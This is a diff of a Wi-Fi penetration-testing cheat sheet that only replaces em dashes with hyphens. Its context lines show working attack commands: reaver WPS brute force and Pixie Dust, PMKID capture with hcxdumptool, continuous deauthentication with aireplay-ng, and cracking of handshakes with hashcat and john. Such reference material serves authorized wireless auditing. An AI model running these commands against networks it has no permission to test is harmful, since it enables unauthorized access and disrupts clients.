@@ -82,11 +82,11 @@ sudo wash -i wlan1mon
 # Reaver online brute force (WPS PIN)
 sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv
 
-# Pixie Dust attack (offline — exploits weak random number generation)
+# Pixie Dust attack (offline - exploits weak random number generation)
 sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -K
 ```
 
-**PMKID Attack (Clientless — No Deauth Needed)**
+**PMKID Attack (Clientless - No Deauth Needed)**
 ```bash
 # Capture PMKID passively
 sudo hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=1
@@ -118,7 +118,7 @@ sudo airodump-ng --encrypt wpa wlan1mon
 
 **Aireplay-ng Advanced Options**
 ```bash
-# Continuous deauth (use with caution — disrupts all clients)
+# Continuous deauth (use with caution - disrupts all clients)
 sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon
 
 # Interactive packet replay
@@ -150,7 +150,7 @@ wpaclean cleaned.cap capture-01.cap
 
 **Cracking with Hashcat (mode 22000)**
 ```bash
-# WPA/WPA2/WPA3 — unified mode (replaces deprecated 2500 and 16800)
+# WPA/WPA2/WPA3 - unified mode (replaces deprecated 2500 and 16800)
 hashcat -m 22000 output.hc22000 wordlist.txt
 
 # With rules
@@ -188,6 +188,6 @@ john --wordlist=wordlist.txt hash.txt
 ---
 
 ## Related Files
-- [hcxtoolshashcat.md](hcxtoolshashcat.md) — Modern passive PMKID/handshake capture with hcxtools and Hashcat mode 22000
-- [pwnagotchi_cheatsheet.md](pwnagotchi_cheatsheet.md) — Automated passive capture using hcxtools/bettercap
-- [WifiMarauder_CheatSheet.md](WifiMarauder_CheatSheet.md) — ESP32 Marauder for mobile WiFi auditing
+- [hcxtoolshashcat.md](hcxtoolshashcat.md) - Modern passive PMKID/handshake capture with hcxtools and Hashcat mode 22000
+- [pwnagotchi_cheatsheet.md](pwnagotchi_cheatsheet.md) - Automated passive capture using hcxtools/bettercap
+- [WifiMarauder_CheatSheet.md](WifiMarauder_CheatSheet.md) - ESP32 Marauder for mobile WiFi auditing
